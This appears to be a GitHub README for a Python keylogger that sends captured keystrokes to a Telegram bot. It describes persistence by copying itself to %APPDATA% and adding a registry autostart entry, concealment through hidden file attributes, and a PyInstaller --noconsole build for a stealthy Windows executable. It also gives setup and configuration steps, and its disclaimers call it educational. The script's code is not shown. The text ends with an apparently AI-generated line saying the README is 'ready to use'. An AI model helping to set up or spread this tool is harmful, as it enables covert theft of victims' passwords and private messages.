# 🛡️ Telegram Keylogger (Python)

> ⚠️ **Legal Disclaimer:** This tool is strictly for **educational use** and **ethical hacking** under authorized conditions. Accessing or logging information from a system without explicit permission is **illegal** and punishable by law. Use it **responsibly and lawfully**.

This project is a lightweight keylogger written in Python that monitors keystrokes and sends the captured logs to a Telegram bot at regular intervals. It includes basic persistence features like auto-start and concealment on Windows systems.

---

## ⚙️ Features

- 🧠 Captures keyboard input in real-time  
- 📩 Sends log data to Telegram via Bot API  
- 🪄 Hides itself from plain view  
- 🖥️ Auto-runs on Windows startup  
- 💾 Minimalistic and easy to set up  

---

## 📦 Dependencies

Make sure you have **Python 3.x** installed.

Install required modules:

```bash
pip install pynput requests
````

---

## 🚀 Getting Started

### 🔸 Step 1: Clone the Repository

```bash
git clone https://github.com/YOUR-USERNAME/YOUR-REPO-NAME.git
cd YOUR-REPO-NAME
```

### 🔸 Step 2: Configure Your Bot

Edit the script and update these lines with your Telegram bot credentials:

```python
bot_token = 'Your BOT Token Here'
chat_id = 'Your Chat ID Here'
```

To get your `chat_id`, send a message to your bot and visit:

```
https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
```

### 🔸 Step 3: Run the Script

To execute it directly:

```bash
python telegram-logger-hj.py
```

### ⚒️ Optional: Create a Windows Executable

Convert to an `.exe` file for Windows:

```bash
pip install pyinstaller
pyinstaller --noconsole --onefile window_keylogger.py
```

Find the executable in the `dist/` folder.

---

## 🧠 How It Works

* 🧲 Listens for keystrokes using `pynput`
* 🔁 Aggregates and sends logs to your Telegram every 60 seconds
* 🗃️ Copies itself to `%APPDATA%` for persistence
* 🫥 Hides its presence using system attributes
* 🔑 Registers itself to Windows startup via registry edit

---

## 📁 Project Structure

```bash
your-keylogger-folder/
├── telegram-logger-hj.py   # Main script
├── README.md             # Project info
```

---

## ⚖️ Ethical Use Policy

This software is designed for **educational** and **authorized penetration testing** only.
❗ **Never deploy or run this script on machines you do not own or do not have explicit permission to test.**
The creator assumes **no liability** for misuse or illegal activity related to this tool.

---

🔐 **Always Hack Ethically.**

```

---

Just replace `YOUR-USERNAME` and `YOUR-REPO-NAME` with your GitHub username and repo name, and it’s ready to use!
```
